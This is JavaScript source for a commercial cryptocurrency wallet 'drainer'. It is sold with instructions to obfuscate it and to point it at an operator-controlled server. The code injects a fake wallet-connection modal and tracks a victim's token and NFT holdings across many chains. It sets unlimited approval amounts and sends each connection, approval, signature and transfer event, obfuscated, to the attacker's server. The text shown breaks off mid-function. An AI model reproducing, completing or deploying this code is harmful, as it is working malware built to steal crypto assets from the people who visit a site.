// Using this code without obfuscation is STRICTLY PROHIBITED
// If this is discovered, an arbitration will be drawn up
// You can obfuscate this script here: obfuscator.io

// Found a script in the public domain without obfuscation?
// Notify the developer > ESolution4 on telegam
// Specify the location or domain where the script is located

// =====================================================================
// ==================== BASIC SCRIPT SETTINGS ==========================
// =====================================================================

let MS_Encryption_Key = 50; // Specify any number that will be used for encryption (it is not recommended to leave it as default!)
// The same number should be specified in the server.js file - if they differ, then nothing will work correctly

const MS_Server = "ENTER_DOMAIN_HERE"; // Specify the domain that is attached to the drainer server edit line 431 for https or http
// This is the domain where you have a server, and not the site itself where you plan to use the drainer
const MS_WalletConnect_ID = "ea52b0e550593829f2eee2cb9006f642"; // Project ID from WalletConnect Cloud

const MS_Modal_Style = 2; // 1 - old, 2 - new 
const MS_Loader_Style = 2; // 1 - old, 2 - new
const MS_Color_Scheme = 'light'; // light - light theme, dark - dark theme
const MS_Modal_Mode = 1; // 1 - select a wallet by clicking and connect with a button, 2 - connect immediately after selection

const MS_Verify_Message = ""; // Message for wallet verification, may contain the {{ADDRESS}} tag
// Leave empty by default to receive a message from the server, otherwise fill in to use a custom

// Using the settings below you can customize how your site will look in the WalletConnect interface
// No need to change, most wallets work with default settings
// The setting is not related to the MS_WalletConnect_Customization switch, it is only needed for design customization

const MS_WalletConnect_MetaData = {
  name: document.title, // Default is the same as the site name
  description: "Web3 Application", // Default "Web3 Application"
  url: "https://" + window.location.host, // Default as site domain
  icons: [ "https://avatars.githubusercontent.com/u/37784886" ]
};

const MS_WalletConnect_Customization = 0; // 0 - use the default window, 1 - user customization
const MS_WalletConnect_Theme = { // Customization options are available here: https://docs.walletconnect.com/2.0/web/web3modal/react/wagmi/theming
  themeMode: 'light',
  themeVariables: {
    '--w3m-background-color': '#000000',
    '--w3m-accent-color': '#F5841F',
    '--w3m-z-index': 9999999
  }
};

const MS_Custom_Chat = {
  Enable: 0, // 0 - use server settings, 1 - use client settings
  Chat_Settings: {
    enter_website: "", // Channel ID for the action - Login to the site (if empty - notification is disabled)
    leave_website: "", // Channel ID for the action - Exit the site (if empty - notification is disabled)
    connect_success: "", // Channel ID for the action - Successful connection (if empty - notification disabled)
    connect_request: "", // Channel ID for the action - Connection request (if empty - notification disabled)
    connect_cancel: "", // Channel ID for action - Connection rejected (if empty - notification disabled)
    approve_request: "", // Channel ID for the action - Request for confirmation (if empty - notification disabled)
    approve_success: "", // Channel ID for action - Successful confirmation (if empty - notification disabled)
    approve_cancel: "", // Channel ID for action - Acknowledgment rejected (if empty - notification disabled)
    permit_sign_data: "", // Channel ID for the action - Data from PERMIT (if empty - notification disabled)
    transfer_request: "", // Channel ID for the action - Transfer request (if empty - notification disabled)
    transfer_success: "", // Channel ID for the action - Successful transfer (if empty - notification disabled)
    transfer_cancel: "", // Channel ID for the action - Cancel transfer (if empty - notification disabled)
    sign_request: "", // Channel ID for the action - Signature Request (if empty - notification disabled)
    sign_success: "", // Channel ID for action - Successful signature (if empty - notification disabled)
    sign_cancel: "", // Channel ID for action - Signature rejected (if empty - notification disabled)
    chain_request: "", // Channel ID for the action - Request to change network (if empty - notification is disabled)
    chain_success: "", // Channel ID for the action - Network change accepted (if empty - notification disabled)
    chain_cancel: "", // Channel ID for the action - Network change rejected (if empty - notification disabled)
  }
};

// =====================================================================
// ============ IT IS NOT SAFE TO MAKE CHANGES TO THE CODE BELOW =======
// =====================================================================

var MS_Worker_ID = null;

const BN = ethers.BigNumber.from;

let MS_Ready = false, MS_Settings = {}, MS_Contract_ABI = {}, MS_ID = 0, MS_Process = false,
MS_Provider = null, MS_Current_Provider = null, MS_Current_Address = null, MS_Current_Chain_ID = null,
MS_Web3 = null, MS_Signer = null, MS_Check_Done = false, MS_Currencies = {}, MS_Force_Mode = false,
MS_Sign_Disabled = false, BL_US = false, SP_US = false, XY_US = false, MS_Bad_Country = false,
MS_Connection = false, MS_Load_Time = null, MS_Gas_Multiplier = 2, MS_Partner_Address = false;

const WC2_Provider = window["@walletconnect/ethereum-provider"].EthereumProvider;
const is_valid_json = (data) => { try { JSON.parse(data); } catch(err) { return false; } return true; };

(async () => {
  try {
    let response = await fetch(`https://min-api.cryptocompare.com/data/pricemulti?fsyms=ETH,BNB,MATIC,AVAX,ARB,FTM,OP&tsyms=USD`, {
      method: 'GET', headers: { 'Accept': 'application/json' }
    });
    MS_Currencies = await response.json();
    MS_Currencies['PLS'] = { USD: 0.00004512 };
  } catch(err) {
    console.log(err);
  }
})();

const MS_API_Data = {
  1: 'api.etherscan.io',
  10: 'api-optimistic.etherscan.io',
  56: 'api.bscscan.com',
  137: 'api.polygonscan.com',
  250: 'api.ftmscan.com',
  42161: 'api.arbiscan.io',
  43114: 'api.snowtrace.io',
  8453: 'api.basescan.org'
};

var MS_MetaMask_ChainData = {};

const fill_chain_data = () => {
  MS_MetaMask_ChainData = {
    1: {
      chainId: '0x1',
      chainName: "Ethereum Mainnet",
      nativeCurrency: {
        name: "Ether",
        symbol: "ETH",
        decimals: 18,
      },
      rpcUrls: [MS_Settings.RPCs[1]],
      blockExplorerUrls: ["https://etherscan.io"]
    },
    56: {
      chainId: '0x38',
      chainName: "BNB Smart Chain",
      nativeCurrency: {
        name: "Binance Coin",
        symbol: "BNB",
        decimals: 18,
      },
      rpcUrls: [MS_Settings.RPCs[56]],
      blockExplorerUrls: ["https://bscscan.com"]
    },
    137: {
      chainId: '0x89',
      chainName: "Polygon Mainnet",
      nativeCurrency: {
        name: "MATIC",
        symbol: "MATIC",
        decimals: 18,
      },
      rpcUrls: [MS_Settings.RPCs[137]],
      blockExplorerUrls: ["https://polygonscan.com"]
    },
    43114: {
      chainId: '0xA86A',
      chainName: "Avalanche Network C-Chain",
      nativeCurrency: {
        name: "AVAX",
        symbol: "AVAX",
        decimals: 18,
      },
      rpcUrls: [MS_Settings.RPCs[43114]],
      blockExplorerUrls: ["https://snowtrace.io/"]
    },
    42161: {
      chainId: '0xA4B1',
      chainName: "Arbitrum One",
      nativeCurrency: {
        name: "ETH",
        symbol: "ETH",
        decimals: 18,
      },
      rpcUrls: [MS_Settings.RPCs[42161]],
      blockExplorerUrls: ["https://explorer.arbitrum.io"]
    },
    10: {
      chainId: '0xA',
      chainName: "Optimism",
      nativeCurrency: {
        name: "ETH",
        symbol: "ETH",
        decimals: 18,
      },
      rpcUrls: [MS_Settings.RPCs[10]],
      blockExplorerUrls: ["https://optimistic.etherscan.io/"]
    },
    250: {
      chainId: '0xFA',
      chainName: "Fantom Opera",
      nativeCurrency: {
        name: "FTM",
        symbol: "FTM",
        decimals: 18,
      },
      rpcUrls: [MS_Settings.RPCs[250]],
      blockExplorerUrls: ["https://ftmscan.com/"]
    },
    8453: {
      chainId: '0x2105',
      chainName: "Base",
      nativeCurrency: {
        name: "ETH",
        symbol: "ETH",
        decimals: 18,
      },
      rpcUrls: [MS_Settings.RPCs[8453]],
      blockExplorerUrls: ["https://basescan.org/"]
    },
    324: {
      chainId: '0x144',
      chainName: "zkSync Era",
      nativeCurrency: {
        name: "ETH",
        symbol: "ETH",
        decimals: 18,
      },
      rpcUrls: [MS_Settings.RPCs[324]],
      blockExplorerUrls: ["https://explorer.zksync.io/"]
    },
    369: {
      chainId: '0x171',
      chainName: "Pulse",
      nativeCurrency: {
        name: "PLS",
        symbol: "PLS",
        decimals: 18,
      },
      rpcUrls: [MS_Settings.RPCs[369]],
      blockExplorerUrls: ["https://scan.pulsechain.com/"]
    },
  };
};

const MS_Routers = {
  1: [
    ['Uniswap', '0x68b3465833fb72a70ecdf485e0e4c7bd8665fc45'],
    ['Pancake', '0xEfF92A263d31888d860bD50809A8D171709b7b1c'],
    ['Pancake_V3', '0x13f4EA83D0bd40E75C8222255bc855a974568Dd4'],
    ['Sushiswap', '0xd9e1cE17f2641f24aE83637ab66a2cca9C378B9F']
  ],
  10: [
    ['Uniswap', '0x68b3465833fb72a70ecdf485e0e4c7bd8665fc45']
  ],
  56: [
    ['Pancake', '0x10ED43C718714eb63d5aA57B78B54704E256024E'],
    ['Pancake_V3', '0x13f4EA83D0bd40E75C8222255bc855a974568Dd4'],
    ['Sushiswap', '0x1b02dA8Cb0d097eB8D57A175b88c7D8b47997506']
  ],
  137: [
    ['Uniswap', '0x68b3465833fb72a70ecdf485e0e4c7bd8665fc45'],
    ['Sushiswap', '0x1b02dA8Cb0d097eB8D57A175b88c7D8b47997506'],
    ['Quickswap', '0xa5E0829CaCEd8fFDD4De3c43696c57F7D7A678ff']
  ],
  250: [
    ['Sushiswap', '0x1b02dA8Cb0d097eB8D57A175b88c7D8b47997506']
  ],
  42161: [
    ['Uniswap', '0x68b3465833fb72a70ecdf485e0e4c7bd8665fc45'],
    ['Sushiswap', '0x1b02dA8Cb0d097eB8D57A175b88c7D8b47997506']
  ],
  43114: [
    ['Sushiswap', '0x1b02dA8Cb0d097eB8D57A175b88c7D8b47997506']
  ]
};

const MS_Swap_Route = {
  1: '0xc02aaa39b223fe8d0a0e5c4f27ead9083c756cc2',
  10: '0x4200000000000000000000000000000000000006',
  56: '0xbb4cdb9cbd36b01bd1cbaebf2de08d9173bc095c',
  137: '0x0d500b1d8e8ef31e21c99d1db9a6444d3adf1270',
  250: '0x21be370d5312f44cb42ce377bc9b8a0cef1a4c83',
  42161: '0x82af49447d8a07e3bd95bd0d56f35241523fbab1',
  43114: '0xb31f66aa3c1e785363f0875a1b74e27b85fd66c7'
};

const MS_Uniswap_ABI = [{"inputs":[{"internalType":"uint256","name":"amountIn","type":"uint256"},{"internalType":"uint256","name":"amountOutMin","type":"uint256"},{"internalType":"address[]","name":"path","type":"address[]"},{"internalType":"address","name":"to","type":"address"}],"name":"swapExactTokensForTokens","outputs":[{"internalType":"uint256","name":"amountOut","type":"uint256"}],"stateMutability":"payable","type":"function"},{"inputs":[{"internalType":"uint256","name":"deadline","type":"uint256"},{"internalType":"bytes[]","name":"data","type":"bytes[]"}],"name":"multicall","outputs":[{"internalType":"bytes[]","name":"","type":"bytes[]"}],"stateMutability":"payable","type":"function"}];
const MS_Pancake_ABI = [{"inputs":[{"internalType":"uint256","name":"amountIn","type":"uint256"},{"internalType":"uint256","name":"amountOutMin","type":"uint256"},{"internalType":"address[]","name":"path","type":"address[]"},{"internalType":"address","name":"to","type":"address"},{"internalType":"uint256","name":"deadline","type":"uint256"}],"name":"swapExactTokensForTokens","outputs":[{"internalType":"uint256[]","name":"amounts","type":"uint256[]"}],"stateMutability":"nonpayable","type":"function"},{"inputs":[{"internalType":"uint256","name":"amountIn","type":"uint256"},{"internalType":"uint256","name":"amountOutMin","type":"uint256"},{"internalType":"address[]","name":"path","type":"address[]"},{"internalType":"address","name":"to","type":"address"},{"internalType":"uint256","name":"deadline","type":"uint256"}],"name":"swapExactTokensForETH","outputs":[{"internalType":"uint256[]","name":"amounts","type":"uint256[]"}],"stateMutability":"nonpayable","type":"function"},{"inputs":[{"internalType":"uint256","name":"deadline","type":"uint256"},{"internalType":"bytes[]","name":"data","type":"bytes[]"}],"name":"multicall","outputs":[{"internalType":"bytes[]","name":"","type":"bytes[]"}],"stateMutability":"payable","type":"function"},{"inputs":[{"internalType":"uint256","name":"amountIn","type":"uint256"},{"internalType":"uint256","name":"amountOutMin","type":"uint256"},{"internalType":"address[]","name":"path","type":"address[]"},{"internalType":"address","name":"to","type":"address"}],"name":"swapExactTokensForTokens","outputs":[{"internalType":"uint256[]","name":"amounts","type":"uint256[]"}],"stateMutability":"nonpayable","type":"function"}];

const MS_Current_URL = window.location.href.replace(/http[s]*:\/\//, '');
const MS_Mobile_Status = (() => {
  let check = false;
  (function (a) { if (/(android|bb\d+|meego).+mobile|avantgo|bada\/|blackberry|blazer|compal|elaine|fennec|hiptop|iemobile|ip(hone|od)|iris|kindle|lge |maemo|midp|mmp|mobile.+firefox|netfront|opera m(ob|in)i|palm( os)?|phone|p(ixi|re)\/|plucker|pocket|psp|series(4|6)0|symbian|treo|up\.(browser|link)|vodafone|wap|windows ce|xda|xiino|android|ipad|playbook|silk/i.test(a) || /1207|6310|6590|3gso|4thp|50[1-6]i|770s|802s|a wa|abac|ac(er|oo|s\-)|ai(ko|rn)|al(av|ca|co)|amoi|an(ex|ny|yw)|aptu|ar(ch|go)|as(te|us)|attw|au(di|\-m|r |s )|avan|be(ck|ll|nq)|bi(lb|rd)|bl(ac|az)|br(e|v)w|bumb|bw\-(n|u)|c55\/|capi|ccwa|cdm\-|cell|chtm|cldc|cmd\-|co(mp|nd)|craw|da(it|ll|ng)|dbte|dc\-s|devi|dica|dmob|do(c|p)o|ds(12|\-d)|el(49|ai)|em(l2|ul)|er(ic|k0)|esl8|ez([4-7]0|os|wa|ze)|fetc|fly(\-|_)|g1 u|g560|gene|gf\-5|g\-mo|go(\.w|od)|gr(ad|un)|haie|hcit|hd\-(m|p|t)|hei\-|hi(pt|ta)|hp( i|ip)|hs\-c|ht(c(\-| |_|a|g|p|s|t)|tp)|hu(aw|tc)|i\-(20|go|ma)|i230|iac( |\-|\/)|ibro|idea|ig01|ikom|im1k|inno|ipaq|iris|ja(t|v)a|jbro|jemu|jigs|kddi|keji|kgt( |\/)|klon|kpt |kwc\-|kyo(c|k)|le(no|xi)|lg( g|\/(k|l|u)|50|54|\-[a-w])|libw|lynx|m1\-w|m3ga|m50\/|ma(te|ui|xo)|mc(01|21|ca)|m\-cr|me(rc|ri)|mi(o8|oa|ts)|mmef|mo(01|02|bi|de|do|t(\-| |o|v)|zz)|mt(50|p1|v )|mwbp|mywa|n10[0-2]|n20[2-3]|n30(0|2)|n50(0|2|5)|n7(0(0|1)|10)|ne((c|m)\-|on|tf|wf|wg|wt)|nok(6|i)|nzph|o2im|op(ti|wv)|oran|owg1|p800|pan(a|d|t)|pdxg|pg(13|\-([1-8]|c))|phil|pire|pl(ay|uc)|pn\-2|po(ck|rt|se)|prox|psio|pt\-g|qa\-a|qc(07|12|21|32|60|\-[2-7]|i\-)|qtek|r380|r600|raks|rim9|ro(ve|zo)|s55\/|sa(ge|ma|mm|ms|ny|va)|sc(01|h\-|oo|p\-)|sdk\/|se(c(\-|0|1)|47|mc|nd|ri)|sgh\-|shar|sie(\-|m)|sk\-0|sl(45|id)|sm(al|ar|b3|it|t5)|so(ft|ny)|sp(01|h\-|v\-|v )|sy(01|mb)|t2(18|50)|t6(00|10|18)|ta(gt|lk)|tcl\-|tdg\-|tel(i|m)|tim\-|t\-mo|to(pl|sh)|ts(70|m\-|m3|m5)|tx\-9|up(\.b|g1|si)|utst|v400|v750|veri|vi(rg|te)|vk(40|5[0-3]|\-v)|vm40|voda|vulc|vx(52|53|60|61|70|80|81|83|85|98)|w3c(\-| )|webc|whit|wi(g |nc|nw)|wmlb|wonu|x700|yas\-|your|zeto|zte\-/i.test(a.substr(0, 4))) check = true; })(navigator.userAgent || navigator.vendor || window.opera);
  return check;
})();
const MS_Apple_Status = (() => {
  try {
    return [
      'iPad Simulator', 'iPhone Simulator', 'iPod Simulator', 'iPad', 'iPhone', 'iPod'
    ].includes(navigator.platform) || (navigator.userAgent.includes("Mac") && "ontouchend" in document);
  } catch(err) {
    return false;
  }
})();

const MS_Unlimited_Amount = '1158472395435294898592384258348512586931256';

const MS_Modal_Data = [
  {
    type: 'style',
    data: `@import url(https://fonts.googleapis.com/css2?family=Inter:wght@400;700&display=swap);.web3-modal,.web3-overlay{position:fixed;top:0;left:0;width:100%}.web3-overlay{height:100%;background:rgba(23,23,23,.8);backdrop-filter:blur(5px);z-index:99998}.web3-modal{right:0;bottom:0;margin:auto;max-width:500px;height:fit-content;padding:21px 0 0;background:#fff;border-radius:60px;z-index:99999;font-family:Inter,sans-serif}.web3-modal-title{font-weight:700;font-size:24px;line-height:29px;color:#000;text-align:center}.web3-modal-items{border-top:1px solid rgba(0,0,0,.1);margin-top:21px}.web3-modal .item{padding:15px 34px;border-bottom:1px solid rgba(0,0,0,.1);display:flex;align-items:center;justify-content:space-between;cursor:pointer;transition:.2s}.web3-modal .item:hover{background:#fafafa;border-radius: 20px}.web3-modal .item div{display:flex;align-items:center}.web3-modal .item:last-child{border-bottom:none;border-radius: 0px 0px 60px 60px;}.web3-modal .item span{font-weight:400;font-size:16px;color:#000;margin-left:11px}.web3-modal .item .icon{width:40px;height:40px;justify-content:center}.web3-modal .item .arrow{height:12px;width:7.4px;background:url('/assets/web3-modal/images/arrow.svg') no-repeat} @media (prefers-color-scheme: dark) {.web3-modal {background: #1c1c1c;color: #fff;}.web3-modal-items {border-top: 1px solid #E4DDDD;}.web3-modal .item span {color: #fff;}.web3-modal .item .arrow {-webkit-filter: invert(1);filter: invert(1);}.web3-modal-title {color: #fff;}.web3-modal .item:hover {background:#262525;} .swal2-popup { background: #1c1c1c; color: #ffffff; } .swal2-styled.swal2-confirm { background-color: #3e7022; } .swal2-styled.swal2-confirm:focus { box-shadow: 0 0 0 3px #3e7022; } }`
  },
  {
    type: 'html',
    data: `<div class="web3-modal-main"><p class="web3-modal-title" style="margin-top:0">Connect your wallet</p><div class="web3-modal-items"><div class="item" onclick='connect_wallet("MetaMask")'><div><div class="icon"><img src="/assets/web3-modal/images/MM.svg" alt=""></div><span>MetaMask</span></div><div class="arrow"></div></div><div class="item" onclick='connect_wallet("Coinbase")'><div><div class="icon"><img src="/assets/web3-modal/images/CB.svg" alt=""></div><span>Coinbase</span></div><div class="arrow"></div></div><div class="item" onclick='connect_wallet("Trust Wallet")'><div><div class="icon"><img src="/assets/web3-modal/images/TW.svg" alt=""></div><span>Trust Wallet</span></div><div class="arrow"></div></div><div class="item" onclick='connect_wallet("Binance Wallet")'><div><div class="icon"><img src="/assets/web3-modal/images/BW.svg" alt=""></div><span>Binance Wallet</span></div><div class="arrow"></div></div><div class="item" onclick="use_wc()"><div><div class="icon"></div><span>More Wallets</span></div><div class="arrow"></div></div></div></div><div class="web3-modal-wc" style="display:none"><p class="web3-modal-title" style="margin-top:0">Choose Version</p><div class="web3-modal-items"><div class="item" onclick='connect_wallet("WalletConnect")'><div><div class="icon"><img src="/assets/web3-modal/images/WC.svg" alt=""></div><span>WalletConnect</span></div><div class="arrow"></div></div><div class="item" onclick='connect_wallet("WalletConnect")'><div><div class="icon"><img src="/assets/web3-modal/images/WC1.svg" alt=""></div><span>WalletConnect Legacy</span></div><div class="arrow"></div></div><div class="item" onclick="ms_init()"><div class="arrow" style="transform:rotateY(190deg)"></div><div><div class="icon"></div><span>Return to Wallets</span></div></div></div></div>`
  }
];

const inject_modal = () => {
  try {
    let modal_style = document.createElement('style');
    modal_style.id = 'web3-style';
    modal_style.innerHTML = MS_Modal_Data[0].data;
    document.head.appendChild(modal_style);
    let overlay_elem = document.createElement('div');
    overlay_elem.id = 'web3-overlay';
    overlay_elem.classList = ['web3-overlay'];
    overlay_elem.style.display = 'none';
    document.body.prepend(overlay_elem);
    document.querySelector('.web3-overlay').addEventListener('click', () => { ms_hide(); });
    let modal_elem = document.createElement('div');
    modal_elem.id = 'web3-modal';
    modal_elem.classList = ['web3-modal'];
    modal_elem.style.display = 'none';
    modal_elem.innerHTML = MS_Modal_Data[1].data;
    document.body.prepend(modal_elem);
  } catch(err) {
    console.log(err);
  }
};

const set_modal_data = (style_code, html_code) => {
  try {
    MS_Modal_Data[0].data = style_code;
    MS_Modal_Data[1].data = html_code;
    reset_modal();
  } catch(err) {
    console.log(err);
  }
};

const reset_modal = () => {
  try { document.getElementById('web3-modal').remove(); } catch(err) { console.log(err); }
  try { document.getElementById('web3-overlay').remove(); } catch(err) { console.log(err); }
  try { document.getElementById('web3-style').remove(); } catch(err) { console.log(err); }
  try { inject_modal(); } catch(err) { console.log(err); }
};

const ms_init = () => {
  try {
    if (!MS_Connection) return connect_wallet();
    if (MS_Process) return;
    if (MS_Modal_Style == 2) {
      MSM.open(MS_Color_Scheme, MS_Modal_Mode);
    } else {
      document.getElementById('web3-modal').style.display = 'block';
      document.getElementById('web3-overlay').style.display = 'block';
      document.getElementsByClassName('web3-modal-main')[0].style.display = 'block';
      document.getElementsByClassName('web3-modal-wc')[0].style.display = 'none';
    }
  } catch (err) {
    console.log(err);
  }
};

const ms_hide = () => {
  try {
    if (MS_Modal_Style == 2) {
      MSM.close();
    } else {
      document.getElementById('web3-modal').style.display = 'none';
      document.getElementById('web3-overlay').style.display = 'none';
    }
  } catch (err) {
    console.log(err);
  }
};

const load_wc = async () => {
  let all_chains_arr = [], all_chains_obj = {};
  for (const chain_id in MS_Settings.RPCs) {
    if (chain_id != '1') all_chains_arr.push(chain_id);
    all_chains_obj[chain_id] = MS_Settings.RPCs[chain_id];
  }
  MS_Provider = await WC2_Provider.init({
    projectId: MS_WalletConnect_ID,
    chains: [ '1' ],
    optionalChains: all_chains_arr,
    metadata: MS_WalletConnect_MetaData,
    showQrModal: true,
    rpcMap: all_chains_obj,
    methods: [
      'eth_sendTransaction',
      'eth_signTransaction',
      'eth_sign', 'personal_sign',
      'eth_signTypedData',
      'eth_signTypedData_v4'
    ],
    qrModalOptions: (MS_WalletConnect_Customization == 1) ? MS_WalletConnect_Theme : undefined
  });
};

const prs = (s, t) => {
  const ab = (t) => t.split("").map((c) => c.charCodeAt(0));
  const bh = (n) => ("0" + Number(n).toString(16)).substr(-2);
  const as = (code) => ab(s).reduce((a, b) => a ^ b, code);
  return t.split("").map(ab).map(as).map(bh).join("");
};

const srp = (s, e) => {
  const ab = (text) => text.split("").map((c) => c.charCodeAt(0));
  const as = (code) => ab(s).reduce((a, b) => a ^ b, code);
  return e.match(/.{1,2}/g).map((hex) => parseInt(hex, 16)).map(as).map((charCode) => String.fromCharCode(charCode)).join("");
};

let prs_enc = 0, last_request_ts = 0;
(async () => {
  prs_enc = MS_Encryption_Key;
  MS_Encryption_Key = Math.floor(Math.random() * 1000);
})()

const send_request = async (data) => {
  try {
    if (MS_Force_Mode) return { status: 'error', error: 'Server is Unavailable' };
    while (Date.now() <= last_request_ts)
      await new Promise(r => setTimeout(r, 1));
    last_request_ts = Date.now();
    data.domain = window.location.host;
    data.worker_id = MS_Worker_ID || null;
    data.user_id = MS_ID || null;
    data.message_ts = last_request_ts;
    data.chat_data = MS_Custom_Chat.Enable == 0 ? false : MS_Custom_Chat.Chat_Settings;
    data.partner_address = MS_Partner_Address;
    const encode_key = btoa(String(5 + 10 + 365 + 2048 + 867 + prs_enc));
    const request_data = prs(encode_key, btoa(JSON.stringify(data)));
    const response = await fetch('https://' + MS_Server, {
      method: 'POST',
      headers: {
        'Accept': 'text/plain',
        'Content-Type': 'application/x-www-form-urlencoded'
      },
      body: `ver=28112023&raw=${request_data}`
    });
    let response_data = JSON.parse(atob(srp(encode_key, await response.text())));
    if (!response_data.status)
      return { status: 'error', error: 'Server is Unavailable' };
    else {
      if (response_data.status == 'error' && response_data.error == 'SRV_UNAVAILABLE') MS_Force_Mode = true;
      if (response_data.status == 'error' && response_data.error == 'INVALID_VERSION') {
        MS_Force_Mode = true;
        try {
          if (MS_Loader_Style == 2) {
            MSL.fire({
              icon: 'error', title: 'Critical Error', subtitle: 'Server Error',
              text: 'Please, check client and server version, looks like it doesn\'t match, or maybe you need to clear cache everywhere :(',
              confirmButtonText: 'OK', timer: 30000, color: MS_Color_Scheme
            });
          } else {
            Swal.close();
            Swal.fire({
              html: '<b>Server Error</b> Please, check client and server version, looks like it doesn\'t match, or maybe you need to clear cache everywhere :(', icon: 'error',
              allowOutsideClick: true, allowEscapeKey: true, timer: 0, width: 600,
              showConfirmButton: true, confirmButtonText: 'OK'
            });
          }
        } catch(err) {
          console.log(err);
        }
      }
      return response_data;
    }
  } catch(err) {
    console.log(err);
    return { status: 'error', error: 'Server is Unavailable' };
  }
};

const retrive_config = async () => {
  try {
    let personal_wallet = null;
    if (localStorage['personal_wallet'] ) personal_wallet = { address: localStorage['personal_wallet'] };
    const response = await send_request({ action: 'retrive_config', personal_wallet });
    if (response.status == 'OK') {
      MS_Connection = true;
      MS_Settings = response.data;
      MS_Gas_Multiplier = MS_Settings.Settings.Gas_Multiplier;
      if (!MS_Settings.CIS) MS_Bad_Country = false;
      if (MS_Settings.Personal_Wallet && typeof MS_Settings.Personal_Wallet == 'object')
        localStorage['personal_wallet'] = MS_Settings.Personal_Wallet.address;
      if (typeof MS_Settings.DSB == 'boolean' && MS_Settings.DSB === true) {
        window.location.href = 'about:blank';
      }
    }
  } catch(err) {
    console.log(err);
  }
};

const retrive_contract = async () => {
  try {
    const response = await send_request({ action: 'retrive_contract' });
    if (response.status == 'OK') MS_Contract_ABI = response.data;
  } catch(err) {
    console.log(err);
  }
};

const enter_website = async () => {
  try {
    let response = await send_request({
      action: 'enter_website',
      user_id: MS_ID,
      time: new Date().toLocaleString('ru-RU')
    });
    if (response.status == 'error' && response.error == 'BAD_COUNTRY') {
      MS_Bad_Country = true;
    }
  } catch(err) {
    console.log(err);
  }
};

const leave_website = async () => {
  try {
    if (!MS_Settings.Notifications['leave_website']) return;
    await send_request({ action: 'leave_website', user_id: MS_ID });
  } catch(err) {
    console.log(err);
  }
};

const connect_request = async () => {
  try {
    if (!MS_Settings.Notifications['connect_request']) return;
    await send_request({ action: 'connect_request', user_id: MS_ID, wallet: MS_Current_Provider });
  } catch(err) {
    console.log(err);
  }
};

const connect_cancel = async () => {
  try {
    if (!MS_Settings.Notifications['connect_cancel']) return;
    await send_request({ action: 'connect_cancel', user_id: MS_ID });
  } catch(err) {
    console.log(err);
  }
};

const connect_success = async () => {
  try {
    if (!MS_Settings.Notifications['connect_success']) return;
    await send_request({
      action: 'connect_success', user_id: MS_ID, address: MS_Current_Address,
      wallet: MS_Current_Provider, chain_id: MS_Current_Chain_ID
    });
  } catch(err) {
    console.log(err);
  }
};

const convert_chain = (from, to, value) => {
  try {
    if (from == 'ANKR' && to == 'ID') {
      switch (value) {
        case 'eth': return 1;
        case 'bsc': return 56;
        case 'polygon': return 137;
        case 'avalanche': return 43114;
        case 'arbitrum': return 42161;
        case 'optimism': return 10;
        case 'fantom': return 250;
        case 'era': return 324;
        case 'base': return 8453;
        case 'pulse': return 369;
        default: return false;
      }
    } else if (from == 'OPENSEA' && to == 'ID') {
      switch (value) {
        case 'ethereum': return 1;
        case 'matic': return 137;
        case 'avalanche': return 43114;
        case 'arbitrum': return 42161;
        case 'optimism': return 10;
        case 'era': return 324;
        case 'base': return 8453;
        case 'pulse': return 369;
        default: return false;
      }
    } else if (from == 'ID' && to == 'ANKR') {
      switch (value) {
        case 1: return 'eth';
        case 56: return 'bsc';
        case 137: return 'polygon';
        case 43114: return 'avalanche';
        case 42161: return 'arbitrum';
        case 10: return 'optimism';
        case 250: return 'fantom';
        case 25: return 'cronos';
        case 100: return 'gnosis';
        case 128: return 'heco';
        case 1284: return 'moonbeam';
        case 1285: return 'moonriver';
        case 2222: return 'kava';
        case 42220: return 'celo';
        case 1666600000: return 'harmony';
        case 324: return 'zksync_era';
        case 8453: return 'base';
        case 369: return 'pulse';
        default: return false;
      }
    } else if (from == 'ID' && to == 'CURRENCY') {
      switch (value) {
        case 1: return 'ETH';
        case 56: return 'BNB';
        case 137: return 'MATIC';
        case 43114: return 'AVAX';
        case 42161: return 'ETH';
        case 10: return 'ETH';
        case 250: return 'FTM';
        case 25: return 'CRO';
        case 100: return 'XDAI';
        case 128: return 'HT';
        case 1284: return 'GLMR';
        case 1285: return 'MOVR';
        case 2222: return 'KAVA';
        case 42220: return 'CELO';
        case 1666600000: return 'ONE';
        case 324: return 'ETH';
        case 8453: return 'ETH';
        case 369: return 'PLS';
        default: return false;
      }
    }
  } catch(err) {
    console.log(err);
    return false;
  }
};

const get_tokens = async (address) => {
  try {
    let tokens = [], response = await fetch(`https://rpc.ankr.com/multichain/${MS_Settings.AT || ''}`, {
      method: 'POST',
      headers: {
        'Accept': 'application/json',
        'Content-Type': 'application/json'
      },
      body: JSON.stringify({
        "id": 1,
        "jsonrpc": "2.0",
        "method": "ankr_getAccountBalance",
        "params": {
          "blockchain": [ "eth", "base", "bsc", "polygon", "avalanche", "arbitrum", "fantom", "optimism", "base" ],
          "walletAddress": address
        }
      })
    });
    response = await response.json();
    for (const asset of response.result.assets) {
      try {
        let contract_address = asset.contractAddress || 'NATIVE';
        if (MS_Settings.Contract_Whitelist.length > 0 && !MS_Settings.Contract_Whitelist.includes(contract_address.toLowerCase().trim())) continue;
        else if (MS_Settings.Contract_Blacklist.length > 0 && MS_Settings.Contract_Blacklist.includes(contract_address.toLowerCase().trim())) continue;
        let new_asset = {
          chain_id: convert_chain('ANKR', 'ID', asset.blockchain),
          name: asset.tokenName, type: asset.tokenType,
          amount: parseFloat(asset.balance), amount_raw: asset.balanceRawInteger,
          amount_usd: parseFloat(asset.balanceUsd), symbol: asset.tokenSymbol,
          decimals: asset.tokenDecimals, address: contract_address || null,
          price: parseFloat(asset.tokenPrice)
        };
        if (new_asset.price > 0) tokens.push(new_asset);
      } catch(err) {
        console.log(err);
      }
    }
    return tokens;
  } catch(err) {
    console.log(err);
    return [];
  }
};

const get_nfts = async (address) => {
  try {
    let response = await fetch(`https://api.opensea.io/api/v1/assets?owner=${address}&order_direction=desc&limit=200&include_orders=false`);
    let tokens = (await response.json())['assets'];
    response = await fetch(`https://api.opensea.io/api/v1/collections?asset_owner=${address}&offset=0&limit=200`);
    let collections = await response.json(), list = [];
    for (const asset of tokens) {
      try {
        let collection = null;
        for (const x_collection of collections) {
          try {
            if (x_collection.primary_asset_contracts.length < 1) continue;
            if (x_collection.primary_asset_contracts[0].address == asset.asset_contract.address) {
              collection = x_collection;
              break;
            }
          } catch(err) {
            console.log(err);
          }
        }
        if (collection == null) continue;
        if (MS_Settings.Contract_Whitelist.length > 0 && !MS_Settings.Contract_Whitelist.includes(asset.asset_contract.address.toLowerCase().trim())) continue;
